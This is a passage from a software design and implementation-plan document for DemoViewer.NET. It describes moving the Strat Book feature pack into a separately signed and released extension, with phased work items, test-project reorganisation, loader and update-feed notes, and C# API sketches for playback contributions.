   extension on and writes the master switch; an upgrade from a settings file without the key keeps it on.
7. **Guards.** A test that scans core namespaces for pack namespace imports (section 9), a
   composition-root test for the pack-off state (no pack store resolved, no startup load registered, no
   pack job kind in the queue), and the `theme-token-catalog.md` drift (`RouteGhost*`, `DropTarget`).
8. **Live toggle, both directions.** On `Changed` to on: `OnEnabledAsync` once, then nudge the coordinator
   (`CapacityAvailable`) so pending paths are reconsidered, and attach to any open 2D Playback tab. On
   `Changed` to off: evaluators stop by predicate; a new `CancelOwned(ownerTag)` cancels every queued pack
   job; `OnDisabled` releases every resident index, cache, service and store the pack built
   (`SituationIndex`, `GrenadeIndex`, `SignatureCache`, `TeamIdentityService`, `LineupClipService`,
   `TagFactsRefresher`, the pack stores and cached VMs; the first four already implement `IDisposable` or
   can) and unsubscribes from `DemoCacheStore.Changed` (decision 3: no "reclaimed on restart"). Test:
   turning it off releases what turning it on built, measured with `GC.GetTotalMemory` after a full
   collect, not assumed.
9. **Measure after.** The same numbers as M0 with the pack off at startup, and after an on-to-off toggle
   in session; record them in section 12. The v1.0.0 memory claim rests on M0 versus item 9.

### Phase 2: registries instead of hardcoded lists (5 items)

10. **Module-declared feature ids.** Descriptors carry `FeatureId`; `_tabFeatureIds` shrinks to the
    built-ins; the pack's descriptors come from `StratBookPack.Features` (item 0).
11. **Evaluator registry.** Ordered by declared `After` ids instead of array position; the pending-path
    union is built from the registry. `AppCompositionRootTests` pins the resolved order, not the literal.
12. **Host-tab contributions.** Replace `TabPlacement.StratBook` and the shell's hub synthesis with a
    pack-declared host tab (`HostId = "stratbook.hub"`) and sections that name their host; `MainViewModel`
    loses its `StratBookHubViewModel` field. Library keeps `TabPlacement.Library` or moves to the same
    mechanism.
13. **Job-kind descriptors.** Label, rank, light and owner registered per kind; the enum keeps the core
    kinds; `KindRank`, `IsLight` and `KindLabel` read the registry. (Small.)
14. **Settings-page and status-chip contributions.** The settings section list is driven by a collection;
    the strat export chip becomes a contributed chip.

### Phase 3: 2D Playback inversions (6 items)

15. **Typed services on the context.** `IModuleContext.GetService<T>()` (first-party only) replaces the
    five `ModuleContext` downcasts and the `App.Services` locator in `Playback2DTabViewModel` and
    `StratCanvasViewModel`; `ModuleContext` stops importing `Modules.StratBook`.
16. **Band menus and the side pane.** `Playback2DTimelineViewModel` gets band-menu contributors in place of
    `CanCreateStrat` and the single `LaneMenu` slot, and the Create Strat review pane becomes a side-pane
    contribution. One design, two commits (the PoC finding below).
17. **Right-column panels.** Tag Palette, Tag Editor, Suggestion Queue and Review panel become panel
    contributions with placement, order, gate and focus scope. The follow-card render test locates cards
    by position, so capture before and after.
18. **Lane contributions with behaviour.** Tag and proposal lanes register through the pack with their own
    press, drag and label handlers; the tab stops special-casing `TagTrack.TrackId` and
    `ProposalTrack.TrackId`; review mode becomes a pack-owned toggle the timeline exposes.
19. **Command ids for keybinds.** String-keyed command ids with default chords and scopes, registered by
    packs; the closed `Playback2DAction` enum keeps core actions; the keybind settings list reads the
    registry. Persisted overrides are `"Action=Gesture"` rows keyed by the action name
    (`AppSettings.KeybindOverrides`), so ids that reuse those names keep every override.
20. **Pointer pre-handler and toolbar item.** Click To Tag as a pointer pre-handler contribution; "Rounds
    like this" as a toolbar item.

### Phase 4: data seams (4 items)

21. **Opaque pack payloads in the demo cache record.** `DemoCacheModels` stops importing pack types: the
    Round Facts, Round Index, Suggestions and Grenade fields move into a `Packs` dictionary of
    `JsonElement` keyed by pack id, with the fingerprints the coordinator needs promoted to a neutral
    `PackStamp(Id, Schema, Fingerprint)`. Old records are read by mapping the old fields once.
22. **Library contributions.** The team filter and provenance chip become `ILibraryContribution`s;
    `MainViewModel` and `LibraryTabViewModel` stop taking `TeamIdentityService` and
    `IDemoProvenanceSource`.
23. **Pack session state.** `SessionPayload.StratBook` becomes a `Packs` dictionary keyed by pack id,
    restored and snapshotted through new `IHostTabViewModel` members (section 7.4 as built), not the
    per-tab `RestoreState` path (that path persists module-tab state, not a pack-wide blob).
24. **Delete Strat Book data.** `StoreDescriptor`s for every pack store and cache path, and a confirmed
    settings action that names the user-work stores (section 8).

### Phase 5: own csproj, option (b) (8 items, required by decision 5)

Possible only once Phases 2 to 4 have cut every core-to-extension edge in section 4.1, because the app
assembly cannot reference the extension. The extension references the app assembly; the heads (Desktop,
Browser) reference both and hand the pack to `App.BuildServices`. No `Core` assembly is needed for this
step.

25. `src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook.csproj`: move the Phase 0b directory up,
    reference the app project, keep namespaces. 26. Move strat-only types out of Playback2D Core and
    Pipeline (`Keyframes/`, `StratFrameSource`, `StratSceneSpec`, `StratHudDataSource`, route palette,
    guides, token tool) into the extension, or leave the neutral ones in core with a note. 27. ViewLocator
    and `avares://` resources across assemblies; embedded palettes and callouts move with the project.
    28. `DemoViewer.NET.Extensions.StratBook.Tests` and the UiCapture variants reference the extension.
    29. Heads register the pack conditionally. 30. A build-time check that the app project does not
    reference the extension (the compiler now enforces it; the test from item 7 is retired). 31. WASM
    publish check: the Browser head compile-links the extension. 32. `scripts/test.sh` gains the extension
    test project and tier.

**Item 25 as built (2026-10-03).** The project is
`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/DemoViewer.NET.Extensions.StratBook.csproj`, one
directory deeper than the sketch above so item 28's test project sits beside it. The Phase 0b tree moved
whole with `git mv`, namespaces unchanged (`RootNamespace` is `DemoViewer.NET`); the embedded palettes and
callouts moved with it under their old `LogicalName`s, and both readers already resolve
`typeof(...).Assembly`, so nothing else changed for them. Phases 2 to 4 had not cut every edge after all:
the composition root still registered the Round Index, Situation Index, Tag Store, Tag Palette, Team
Identity, Provenance and Teams tab services, wired Match Overview's grenade hooks and flushed the Tag Store
at shutdown; `ReviewQueue.FromTag` took a tag type; `AssetZonePlaceResolverSource` implemented a pack
interface from core; the 2D round track and tab read `RoundFacts`/`IRoundFactsSource`; `SituationsSettings`
stored `RoundIndexTokenSource`. Item 25 moved the registrations into `StratBookPack.Register`, the grenade
hooks into a new `IPackContributions.Shell` attachment (section 7.2), the Tag Store flush into
`StratBookLifecycle.OnShutdown` (through a `Tags` slot on the instances tracker), `FromTag` into the pack as
`TagClips.FromTag`, and the zone resolver source into the pack; it moved the Round Facts models and the
`IRoundFactsSource` interface and the token-source enum into core (the implementations stayed). The
Desktop and Browser heads reference the extension and call `FeaturePacks.Configure([new StratBookPack()])`
before Avalonia starts, which is item 29's content pulled forward because 25 does not compile without it.
Item 27's work landed here too (the `ViewLocator` searches the pack assemblies; the pack had no `avares://`
URI or `assembly=` xmlns to repoint), as did item 30's test half (`PackBoundaryTests` asserts the app
csproj has no `Extensions` project reference; its allow-list is empty). Item 31 was checked locally (the
Browser head builds in Release). Item 32 needs nothing until item 28 creates the test project:
`scripts/test.sh` lists test projects only, and CI builds the solution. Section 13 has the layout and rules.

**Item 28 as built (2026-10-03).** The project is
`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook.Tests/DemoViewer.NET.Extensions.StratBook.Tests.csproj`,
mirroring `DemoViewer.NET.App.Tests.csproj` (TUnit, Avalonia.Headless/Skia/Fonts.Inter, the same
`System.GC.ConserveMemory` option, `RootNamespace` set to `DemoViewer.NET.AppTests` rather than its own
name). `git mv` moved the 172 files under `App.Tests/Extensions/StratBook/` whole, plus seven files that
lived at the App.Tests root but tested pack types directly rather than core behaviour with the pack as a
fixture: `ReviewModeTests`, `StratBookShellTests`, `StratBookShellRenderTests`, `StratBookHubAccess`,
`SuggestedTagsTuningViewModelTests` (its subject, `SuggestedTagsTuningViewModel`, is itself in the
extension), `GeneratedInboxTests` and `DeferredStoreLoadTests` (both render or drive pack viewmodels
directly: `Views.SuggestedTags`, `ViewModels.Teams`). The rule applied uniformly: a root file moves when
its assertions reach a pack-owned type beyond the pack's own root namespace; it stays when a core
mechanism (feature gating, the cache record's pack-payload seam, the deferred-store-load pattern, the
Review Queue, the generated-items inbox rule, the UI-thread audit) is tested with a pack type only as a
concrete fixture.

`AppCompositionRootTests` moved whole on the first pass, on the same reasoning (several of its cases
reach into `Modules.SuggestedTags.SuggestedTagsService` and `Modules.UtilityBook.GrenadeIndexEvaluator`,
not just the pack root), and a review of this item reversed that: a composition-root smoke test is core's
regression gate regardless of which cases happen to touch a pack type, and moving it whole left App.Tests
with no such gate at all. It is split per test instead, the same treatment `ReviewQueueTests` got below.
9 of its 14 cases (desktop/browser resolve, the launch-hang regression, the three singleton checks,
`NeedsFirstRun`, the `IOptionsMonitor` wiring, `WireTheme`) test core only, with the real configured pack
list as their fixture exactly as before, and stayed `AppCompositionRootTests` in App.Tests. The other 5
(the hub/Strats layout, the two evaluator fan-out-order cases, the Situation/Grenade index coordinator
wiring, and the pack-off evaluator/badge case) reach pack-owned types for their own assertions, not merely
to build the fixture, and moved to the extension project as `StratBookCompositionRootTests`; both classes
duplicate the shared `WithProvider` harness rather than reference each other's assembly.

`PackOffCompositionTests` and `StratBookPackBaselineTests`, already inside
`Extensions/StratBook/`, moved with the batch for the same reason (both construct `GrenadeIndexEvaluator`
and `SuggestedTagsService` instances directly). `PackBoundaryTests` is the one exception pulled back out:
it has no pack-owned using anywhere in its body (it scans csproj XML and namespace text), so it moved to
`App.Tests/Extensions/PackBoundaryTests.cs`, beside the other pack-agnostic contribution tests, instead of
into the extension project. `ReviewQueueTests` was split rather than moved or kept whole: its "Review tab"
section drove `ReviewQueueTabViewModel` and `ReviewQueueModule` (both pack-owned) directly, so those three
tests became `ReviewQueueTabTests` in the extension project; the rest of the file, which exercises
`ReviewQueue` itself (core, per section 13), stayed. Namespaces are untouched everywhere: of the 182 files
in the extension test project, 170 are in the flat `DemoViewer.NET.AppTests` namespace and 12 in
`DemoViewer.NET.AppTests.Extensions.StratBook`, kept whatever they had, because the project's own namespace
convention was already inconsistent before this item and fixing that was not this item's job.

Shared test support is compile-linked, not a `ProjectReference` to `App.Tests`: both assemblies'
`[ModuleInitializer]`s would run in one process when the ext suite touches an App.Tests type
(`CompiledInPacks` calling `FeaturePacks.Configure` a second time throws on the `FrozenList`;
`SessionIsolation` would repoint `DEMOVIEWER_CONFIG_DIR` out from under the first assembly), and TUnit would
likely register App.Tests' own tests a second time in the ext process. Twelve files stay physically in
App.Tests and are linked into the extension project's compilation: `GlobalUsings.cs`, `CompiledInPacks.cs`,
`SessionIsolation.cs`, `HeadlessSession.cs`, `Playback2DFakeContext.cs`,
`Playback2DTimelineHeadlessSupport.cs`, `SyntheticParsedDemo.cs`, `QueuedPost.cs`, `TestLibraries.cs` (used
by `StratBookShellTests` and `StratBookShellRenderTests`), `Extensions/FakeManifests.cs` (item 33's manifest
fixtures, used by `StratBookPackTests`' `FakePack`), and two helpers pulled out of test classes that have
their own tests so linking the whole file would double-register them: `FakeTimelineData.cs` out of
`TimelineTrackTests.cs`, `Playback2DActivation.cs` out of `Playback2DActionDispatchTests.cs`. Four files
moved to the extension project with the batch and are linked back into App.Tests, because core-mechanism
tests that stayed need them as fixtures: `RoundIndexTestData.cs` and `CacheRecordTestExtensions.cs` (used,
between the two, by `DemoCachePackPayloadTests`, `DemoCacheRoundIndexStampTests`, `PackDataRemoverTests`,
`ReviewQueueTests`, `SidecarFormatTests`, `BackgroundPlanRealDemoTests`, `ForwardPassRealDemoTests`,
`ForwardQueueTests`), `StratBookHubAccess.cs` (used by `UiThreadAuditTests`, which walks the StratBook hub
the same way it walks every other section), and `ToleranceSliderHarness.cs`, extracted from
`ToleranceSliderTests.cs` (which has its own tests) for the same reason, needed by
`ZonePlaceResolverSourceTests`. `src/Testing/DemoViewer.NET.TestSupport`
(the `DemoTestHelper`/`GameEventPayloadExtensions` project) is referenced by both projects as before; it
needed no change. `tests/shared/*.cs` (the test-tier contract) is picked up automatically, the same
`Directory.Build.props` rule that reaches every `*.Tests` project.

Both AssemblyInfo.cs files (the app's and the extension's) gained
`InternalsVisibleTo("DemoViewer.NET.Extensions.StratBook.Tests")` beside their existing App.Tests and
UiCapture grants. `DemoViewer.NET.UiCapture` needed no change: it has no reference to App.Tests or to any
file that moved. Section 13 has the as-built layout.

**Item 31, confirmed.** `.github/workflows/ci.yml`'s `wasm-build` job already runs
`dotnet publish src/App/DemoViewer.NET.Browser -c Release`, and the Browser head's csproj has referenced
the extension since item 25. No workflow change was needed.

**Item 32 as built.** `scripts/test.sh`'s project table gained
`"ext|src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook.Tests"` after `app`; the tier filter,
the default (`all`) selection and the per-project timing line are generic over the table, so nothing else
in the script changed. `ci.yml`'s `app-tests` job gained one step, `Extensions (Strat Book) suite, full
tier`, running `scripts/test.sh -t full -p ext` after the batched App suite step, in the same job rather
than a new one. `scripts/test-app-suite.sh` (the batched runner) was not touched: it is hardcoded to
`DemoViewer.NET.App.Tests` by design, and the extension suite has not needed batching on its first run.

### Phase 6: independent release cadence (about 6 items)

The extension ships and updates separately from the app. Bounded by one hard fact: the extension uses
CS2DemoKit types directly (33 files), so an extension build is compatible only with app builds on the
same CS2DemoKit version and app contract. The loader enforces that and disables, never crashes.

33. **Contract version.** The app exposes `ExtensionHostVersion` (the pack contracts) and its CS2DemoKit
    version; the extension carries a manifest (`extension.json`: id, version, `requiresHost` range,
    `requiresCs2DemoKit`). A mismatch disables the extension with a settings-page message.
    *As built (2026-10-03):* the host is `ExtensionHost` (`ContractVersion` 1.0.0, `AppVersion`,
    `Cs2DemoKitVersion` read from the referenced assembly and pinned by test to the package pin); the
    manifest is `src/Extensions/StratBook/extension.json`, embedded and copied beside the DLL, surfaced
    as `IFeaturePack.Manifest`; the check runs inside `FeaturePacks.Configure`, and the catalog, the
    registries, the composition root and the ViewLocator read `FeaturePacks.Compatible`; Settings reads
    `FeaturePacks.Statuses` for the version on each row and the locked row with the reason. Section 7.7
    has the schema, the version rule and the rest.
34. **Loader.** At startup the Desktop head loads first-party extension assemblies from
    `<config root>/extensions/<id>/<version>/` when present, else the copy shipped in the installer. Loads
    into the default context (no unload: "off" is the Phase 1 switch, not an unload). Browser head
    unchanged: it compile-links the version it was built with.
    *As built (2026-10-03):* `ExtensionLoader.Resolve` in `Program.Main` picks, per shipped pack, the
    highest staged version that is newer than the bundled one, passes the section 7.7 check and is
    accepted by an `ITrustPolicy` (item 35's seam; until then nothing on disk is trusted without the
    developer opt-in `DEMOVIEWER_EXTENSIONS_TRUST_UNSIGNED=1`), loads it, and falls back to the shipped
    copy on any failure, each refusal a `LoadOutcome` Settings shows under the row. Not the default
    context after all: the shipped assembly is on the trusted platform list, so a by-path load into the
    default context returns the app-directory copy; a staged copy loads into a named non-collectible
    `ExtensionLoadContext` that resolves everything else through the default context. Section 7.8 has
    the directory, the rule, the constraints and the evidence.
35. **Signing and trust.** Only assemblies signed with the project's key load from the config root;
    anything else is ignored with a log line. First-party only; the add-on design's consent UX is not
    pulled in.
    *As built (2026-10-03):* ECDSA P-256/SHA-256 (no standalone Ed25519 in .NET 10), a detached
    `extension.sig` over a canonical whole-tree digest, `PublisherKeys` embedded in the app, and
    `SignedTrustPolicy` filling the `ITrustPolicy` seam item 34 left; `TrustPolicy.Default` now checks
    signing first and the developer opt-in second. A signing tool at `tools/extension-signing` (outside
    the `.slnx`) generates keys, signs and verifies. Section 7.9 has the digest format, the verification
    order, the tool and the action required on the private key.
36. **Update feed.** Velopack owns `current/` and cannot carry a second package, so the extension has its
    own feed (a GitHub release per extension version); the app's Update service checks it, downloads,
    verifies, stages under the config root and applies on next start. Settings shows the installed and
    available versions under "Extensions".
    *As built (2026-10-03):* the feed is one `extensions.json` per extension (`ExtensionFeed`), a release
    asset whose default URL is built from the same repository constant the release notes read;
    `ExtensionUpdateService` (`Extensions/Updates/`) fetches it through `IExtensionFeedClient`, judges every
    entry's manifest with the section 7.7 check behind one predicate (`IsOffered`, decision 6's seam), and
    downloads to `extensions/.staging/`, where the zip's size and sha256 are checked before it is opened,
    the extraction is bounded and refuses any path that escapes, the root `extension.json` must name the
    entry's id and version, and the loader's `ITrustPolicy` judges the unpacked directory; only then is it
    renamed to `extensions/<id>/<version>/` for item 34's loader. Every step is a queue item at user
    priority. Settings shows one update line per extension row, checks on open at most once an hour, and
    offers Update and Check buttons. Section 7.10 has the feed schema, the zip layout item 37 must produce,
    the staging rules and the Settings states.
37. **CI and packaging.** A release workflow per extension producing the signed zip and feed entry; the
    app installer still bundles the extension version current at app release time.
    *As built (2026-10-03):* `scripts/pack-extension.sh` (build, stage, sign, zip, feed entry) and
    `.github/workflows/release-extension.yml`, two jobs (`build-and-pack`, `contents: read`; `publish`,
    `needs: build-and-pack`, `contents: write`, gated on `do_publish`), plus five new
    `tools/extension-signing` commands (`report`, `manifest`, `zip`, `feed-merge`/`feed-check`) and a
    packaging-drift step added to `ci.yml`'s `build` job. Every dispatch input and ref-derived value
    passes through a step's `env:` rather than `${{ }}` in `run:` text, and the resolved id is checked
    against the manifest id shape before use; the signing secret is scoped to `build-and-pack` and only
    passed when `do_publish == '1'`, and `pack-extension.sh` itself refuses that secret in `--dry-run`
    regardless. The rolling feed is merged and validated before the per-version release is touched, so
    a refused downgrade leaves nothing orphaned. Section 7.11 has the rest: the tag convention, the zip
    layout as produced, the feed update rules, the secrets and the action required, the dry-run path, and
    how to cut a release step by step. Nothing changes in `release.yml`: the app installer bundles
    whichever extension version the heads reference at app release time, same as before this item.
    Deviations from the sketch above: (1) the shipped manifest is still copied beside the app's DLL
    under the bare name `extension.json` (section 7.8); item 37 does not rename it to `<id>.extension.json`
    because that touches `ShippedPack.BesideApp`, the app csproj and the loader/matrix tests, none of
    which are this item's hot file (a release workflow); it is still item 37's to do, just not done here,
    and stays a one-extension limitation until it is. (2) The release workflow's concurrency group is a
    constant string, not one computed per extension id, for the same one-extension reason (section 7.11
    has the detail).
38. **Compatibility matrix test.** A test that builds the extension against the app and asserts the
    manifest's ranges match the referenced versions, so a release cannot ship an unloadable pair.
    *As built (2026-10-03):* `CompatibilityMatrixTests` in App.Tests, plus `CompatibilityReport`
    (section 7.7 has both).

Other first-party modules (Highlights, Rule Workbench, Library sections) can take the same layout later;
nothing here depends on it.

### Proof of concept

Not built on this spike. The cheapest seam to prototype, item 16's menu, does not stand alone: the menu
item's action opens the Create Strat review pane at `Playback2DView.axaml:525-540`, which is bound to a
property on the tab VM. A menu contribution without a pane contribution would still need the tab VM to
know about `CreateStratDialogViewModel`, which proves nothing about the boundary. So the finding the PoC
would have produced is recorded instead: **a 2D Playback contribution is a pair (an entry point plus the
surface it opens), and the contribution API must carry both** (section 7.3, `IPlaybackContribution`).

---

## 7. Proposed extension API

Sketches, not code. Names follow the existing contracts. Everything here is first-party and lives in the
app (option a) or in `DemoViewer.NET.Core` (option b); none of it goes into the public
`Modules.Abstractions` package until the add-on work wants it.

### 7.1 The pack

```csharp
public interface IFeaturePack
{
    string Id { get; }                       // "net.demoviewer.pack.stratbook"; persisted key, distinct from the module id
    string FeatureId { get; }                // "pack.stratbook"; the umbrella gate
    IEnumerable<FeatureDescriptor> Features { get; }   // parented to FeatureId
    void Register(IServiceCollection services);        // all DI, unconditional (factories are lazy)
    void Contribute(IPackContributions to, IServiceProvider sp);
}

public interface IPackLifecycle            // optional, resolved from the pack's own registrations
{
    Task OnEnabledAsync(PackStartReason reason, CancellationToken ct);  // startup loads, subscriptions
    Task OnDisabledAsync();                  // unsubscribe, cancel owned jobs, release resident indexes (completes when released)
    void OnShutdown(TimeSpan budget);        // flushes
}

public interface IPackResident              // a pack-built singleton whose state can be dropped and rebuilt (item 8)
{
    void Attach();                           // subscribe to the sources that keep it current; loads nothing
    void Release();                          // unsubscribe, flush what is pending, drop the state
}
```

`Register` is unconditional on purpose: registrations are free, and conditional DI makes "turn on without
restart" impossible. What the gate controls is `OnEnabledAsync`, the evaluators' predicates, and the
contributions' visibility.

### 7.2 Contributions

```csharp
public interface IPackContributions
{
    void Module(IWorkspaceModule module);                    // tabs and sections
    void HostTab(HostTabContribution host);                  // a tab that hosts sections (the hub)
    void Evaluator(string id, Func<IDemoEvaluator> factory, params string[] after);
    void JobKind(JobKindDescriptor kind);                    // label, rank, light, owner
    void SettingsPage(SettingsPageContribution page);        // header, order, VM factory, view factory, keywords
    void StatusChip(StatusChipContribution chip);
    void Playback(IPlaybackContribution contribution);       // see 7.3
    void Library(ILibraryContribution contribution);         // filters, card badges, sections
    void Commands(IEnumerable<CommandDescriptor> commands);  // keybinds and palette
    void Session(string key, ISessionParticipant participant);
    void Store(StoreDescriptor store);                       // paths, for "delete pack data"
    void Migration(string id, Func<IDemoProcessingQueue, Task> submit, TimeSpan delay);
    void Route(string prefix, Func<string, bool> navigate);  // "stratbook/strat/{id}"
}
```

Every contribution carries the pack's `FeatureId` implicitly (the pack registered it), and may carry a
narrower sub-feature id. The shell shows a contribution only when both resolve on.

As built (item 25): `void Shell(Action<MainViewModel> attach)` joined the list. The shell factory runs every
pack's attachments once, right after the shell is constructed and before anything can resolve it, which is
the moment the composition root used to wire a pack's delegates by hand. It exists for the delegate slots a
core page exposes (Match Overview's `IndexGrenades`, `AreGrenadesIndexed`, `PackEnabled`); an attachment
must not resolve the shell itself and reaches everything else lazily. The pack's lifecycle was the wrong
place: resolving the shell from `OnEnabledAsync` constructed it during `StartPacks`, which put the shell's
own startup loads ahead of the pack's on the queue.

### 7.3 2D Playback

```csharp
public interface IPlaybackContribution
{
    void Attach(IPlaybackSurface surface, IModuleContext context);  // per tab VM instance
    void Detach();
}

public interface IPlaybackSurface
{
    IReadOnlyList<MapLevel> MapLevels { get; }                     // the mounted viewport's levels; empty without one
    Playback2DKeymapProfile Keymap { get; }                        // the tab's resolved keymap, replaced whole on a rebind
    event Action? KeymapChanged;
    event Action? Deactivated;                                     // before the tab flushes its documents
    IDisposable OnDemoChanged(Action handler);                     // on activation and on a demo reset, after the resync
    IDisposable OnPlayheadChanged(Action<int> handler);            // the tick, on every playhead update
    IDisposable AddBandMenu(Func<TimelineBandViewModel, IEnumerable<MenuEntry>> items);
    ILaneHandle AddLane(ITimelineTrack track, TimelineBandRow row, ILaneBehaviour? behaviour = null);
    IDisposable AddModeToggle(ModeToggle toggle);                  // the toolbar renders it; its action flips it
    IPaneHandle AddPane(PanePlacement where, int order, Func<object> viewModel);  // Side; RightColumn forwards to AddPanel
    IPanelHandle AddPanel(int order, Func<object> viewModel, Func<Control>? view = null, string? featureId = null,
        ModeToggle? mode = null);                                  // shown while open, gate on and the mode on
    IDisposable AddKeyHandler(Func<Key, KeyModifiers, bool> handler);             // before the tab's keymap, in order
    IDisposable AddActionHandler(Func<Playback2DAction, bool> handler);           // unhandled actions; first while a panel has the keyboard
    IDisposable AddToolbarItem(ToolbarItem item);                                 // the toolbar and the overflow menu both list it
    IDisposable AddPointerPreHandler(Func<ScenePointer, bool> handler);           // before the tool router, on a primary press not diverted to pan
    string GestureHint(Playback2DAction action);                                  // " (Ctrl+F)" under Keymap, or "" unbound
    // Not built yet, in the order the items need them:
    void AddLayer(string layerId, Func<ISceneLayer> layer);                                     // later; guides
    void AddTool(IPointerTool tool);                                                            // later; token
}

public sealed record ScenePointer(MapLevel Level, double WorldX, double WorldY, SKPoint Screen,
    ToolModifiers Modifiers, Scene2DFrame Frame, Func<PlaceResolver?> Zones);   // Zones is lazy: read only if a handler asks

public sealed class ToolbarItem   // a button a contribution adds; also an overflow-menu entry
{
    public ToolbarItem(string id, string label, string tooltip, Func<Scene2DFrame, bool> run,
        Playback2DAction? action = null, int order = 0, string? icon = null);
    public string Label { get; set; }        // mutable: the owner refreshes it on KeymapChanged
    public string Tooltip { get; set; }
    public ICommand? Command { get; }         // wired by AddToolbarItem; what the view binds
}

public interface ILaneBehaviour   // what a lane does; the timeline dispatches to the lane whose track made the band
{
    void OnBandPressed(TimelineBandViewModel band, ITimelineData data);          // before the seek
    IEnumerable<MenuEntry> MenuFor(TimelineBandViewModel band, ITimelineData data);  // before the band-menu contributors'
    void OnLabelRequested(int frame);                                            // empty lane clicked while IsEditable
    void OnEditSpanDragged(int startFrame, int endFrame);                        // a handle of EditSpan moved
}

public interface ILaneHandle : IDisposable   // Dispose unregisters the track and its behaviour
{
    ITimelineTrack Track { get; }
    bool IsSuppressed { get; set; }          // hidden for a mode; the user's own toggle is untouched
    bool IsEditable { get; set; }            // the row shows even empty; a click asks for a label
    (int Start, int End)? EditSpan { get; set; }   // drawn with two handles; one lane's at a time
}

public sealed class ModeToggle   // a mode of the tab a contribution owns
{
    public ModeToggle(string id, string label, string tooltip, Playback2DAction? action = null, string? icon = null);
    public bool IsOn { get; set; }           // raises Changed on a flip
    public bool IsAvailable { get; set; }    // off: the toolbar hides the toggle; the action only leaves the mode
    public event Action? Changed;
}

public interface IPaneHandle : IDisposable   // Dispose removes the pane; Close only hides it
{
    bool IsOpen { get; }
    void Open();     // Side: a fresh view model, an open pane is rebuilt, the other Side pane closes. RightColumn: no-op when open
    void Close();    // disposes the view model when it is IDisposable
    event Action? Closed;
}

public interface IPanelHandle : IPaneHandle   // a right-column panel; several open at once
{
    bool IsShown { get; }            // open, gate on, and the column showing contributed panels (Review mode)
    event Action? ShownChanged;
    bool HasKeyboard { get; set; }   // the focus scope: the contribution mirrors its own focus here
}

public sealed record MenuEntry(string Header, Action Run);
```

As built by item 16 (`Extensions/IPlaybackContribution.cs`, `Extensions/IPlaybackSurface.cs`): the two
registrations return disposables, so a contribution's `Detach` undoes exactly what its `Attach` added, and
`MapLevels` is on the surface because the Create Strat capture keys a pawn's Z to the mounted viewport's
floors, which only the view knows. `Playback2DTabViewModel.Surface` is the implementation
(`Playback2DSurface`): band menus join `Playback2DTimelineViewModel.BandMenus`, the contributor list that
replaced `CanCreateStrat`, `RequestCreateStrat`, `CreateStratRequested` and the single `LaneMenu` slot (the
tab's own lane menu is the first contributor); side panes bind to one host in `Playback2DView.axaml`, the
export pane's place, one open at a time, and opening one closes the export. `PlaybackContributionHost`
(`Extensions/`) attaches every pack's contributions from `PackContributionSet` to a tab and follows the
gate's `Changed` live; `BuildRegistry` hands it to `Playback2DModule`, whose tab factory gives it to each
tab view-model, which attaches on its first activation (the context arrives there) and detaches on dispose.
The tab closes any open side pane on deactivation and on demo reset, as it closed the Create Strat review
before.

The Create Strat contribution (`src/Extensions/StratBook/DemoViewer.NET.Extensions.StratBook/Modules/StratBook/CreateStratPlaybackContribution.cs`)
adds a band-menu entry for round bands whose action opens a pane it added (`AddPane(PanePlacement.Side,
...)`), using `IStratCapture` resolved from `context.GetService<T>()` at every band press, which is how the
gate reaches it. That pairing is the PoC finding in section 6 (item 16).

As built by item 17 (`Extensions/IPlaybackSurface.cs`, `Modules/Playback2D/Playback2DSurface.cs`): the right
column is hosted. `AddPanel(order, viewModel, view, featureId)` adds a panel; `AddPane(PanePlacement.RightColumn,
...)` is the same call with no gate and the ViewLocator's view, and returns the same `IPanelHandle`. Right-column
handles differ from side-pane handles in three ways: several panels are open at once and `Open` on an open
panel is a no-op (the view models are long-lived, built once at attach, so a panel keeps its state across the
mode); a panel has a gate, the `featureId` read through the tab's `IModuleContext.Features`, and `IsShown`
folds the gate, the open state and the mode together, so a gated-off panel hides without closing; and a panel
has a focus scope, `HasKeyboard`, which the contribution sets from its own focus state (the palette's
`IsFocused`). `Playback2DSurface.Panels` is the ordered list of open panels the view's `ItemsControl` binds; each
item presents either the contributed control with the view model as its DataContext or the view model itself
for the ViewLocator, under a 6 px gutter, and follows `IsShown`. The core column content (game info, the player
cards) keeps its rows; the panels fill the third row as the inline views did, so the follow-card render test
passes unchanged.

Keys and actions route through the surface rather than the tab naming a panel. `AddKeyHandler` is asked by the
view before the tab's keymap, in registration order, which is how the `WhenPaletteFocused` and
`WhenSuggestionSelected` rows shadow the always rows (the handler resolves its scope against `Keymap`);
`AddActionHandler` is asked for every action the tab does not handle itself, and for every action first while
a shown panel `HasKeyboard`, which is how undo and redo are the tags' while the palette has the keyboard. The
tab's `IsReviewAvailable` is "an open panel whose gate is on", so a tab with no contributed panel offers no
Review toggle and never collapses the cards.

The palette gives the keyboard back (`Leave`: the pending tag written, the note dropped, focus off) on two
signals the contribution subscribes to and `Detach` drops: `IPlaybackSurface.Deactivated`, which the tab
raises before it flushes its documents (the contribution flushes its own session there), and
`TagSession.Detaching`, raised before a swap inside `AttachAsync` or a `Detach` lets go of the document,
while the old document is still current. So the tab calls nothing on the palette by name, and neither focus
nor a half-typed note survives a tab switch or a demo swap.

As built by item 18 (`Modules/Playback2D/Timeline/ILaneBehaviour.cs`, `Extensions/ModeToggle.cs`): the lanes,
the mode and the session are the pack's, and the three hooks item 17 left (`IsReviewMode`, `ReviewModeChanged`,
`Timeline`) are gone with the tab's `TagSession`, `TagTrack`, `ProposalTrack`, `IsReviewMode`, `Tags`,
`AttachTagsToCurrentDemo` and its `TryResolve<T>` locator; the tab imports no pack namespace for them and
`PackBoundaryTests` lists no item-18 edge.

- *Lanes.* `AddLane(track, row, behaviour)` is `Playback2DTimelineViewModel.RegisterLane`: the track registers
  as before (registration order is display order; a track registered after the build is built at once, so a
  pack turned on in session shows its lane without a re-query) and the timeline keeps the lane beside it.
  Dispatch is by the lane that made the band, never by track id: `PressBand` calls the lane's `OnBandPressed`
  before the seek, `MenuFor` puts the lane's entries before the `BandMenus` contributors', `RequestLaneLabel`
  goes to the first editable lane, and `DragEditEdge` moves the span of the lane that owns it and tells that
  lane. The handle carries the state the contribution used to set through `Timeline`: `IsSuppressed` is
  `SetTrackSuppressed` by the track's id (the user's toggle untouched, `IsTrackSuppressed` still answers by
  id), and the row folds `IsLaneEditable`, `ShowLane`, `HasEditSpan`, `EditX` and `EditWidth` from every lane's
  `IsEditable` and `EditSpan`. Disposing the handle is `UnregisterTrack`: the toggle, the bands, the markers,
